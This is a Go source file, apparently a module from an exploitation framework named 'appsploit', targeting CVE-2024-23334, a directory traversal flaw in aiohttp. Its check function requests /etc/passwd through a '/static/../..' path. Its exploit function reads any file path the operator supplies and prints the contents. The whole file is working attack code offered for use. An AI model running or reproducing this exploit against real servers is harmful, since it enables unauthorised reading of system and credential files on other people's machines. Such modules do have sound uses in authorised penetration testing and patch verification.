package vul

import (
	"appsploit/pkg/utils"
	appVul "appsploit/pkg/vul"
	"fmt"
	"github.com/urfave/cli/v2"
	"strings"
)

type CVE_2024_23334 struct {
	appVul.BaseVulnerability
}

var CVE_2024_23334_v1 = CVE_2024_23334{
	BaseVulnerability: appVul.BaseVulnerability{
		Name:        "CVE-2024-23334",
		Description: "Aiohttp Directory Traversal",
	},
}

func (cve CVE_2024_23334) CheckSec(ctx *cli.Context) (bool, error) {
	errorData := error(nil)
	baseURL := utils.Http.FormatURL(ctx)
	resp, errorData := utils.Http.Get(baseURL + "/static/../../../../../../../../../etc/passwd")
	if errorData != nil {
		return false, errorData
	}
	if strings.Contains(resp, "root:") {
		CVE_2024_23334_v1.VulnerabilityExists = true
	} else {
		CVE_2024_23334_v1.VulnerabilityExists = false
	}
	return CVE_2024_23334_v1.VulnerabilityExists, errorData
}

func (cve CVE_2024_23334) Exploit(ctx *cli.Context) (err error) {
	errorData := error(nil)
	baseURL := utils.Http.FormatURL(ctx)
	args := ctx.String("args")
	if !strings.HasPrefix(args, "/") {
		args = "/" + args
	}
	resp, err := utils.Http.Get(baseURL + "/static/../../../../../../../../.." + args)
	if err != nil {
		return err
	}
	fmt.Println("Response:\n\n" + resp)

	return errorData
}
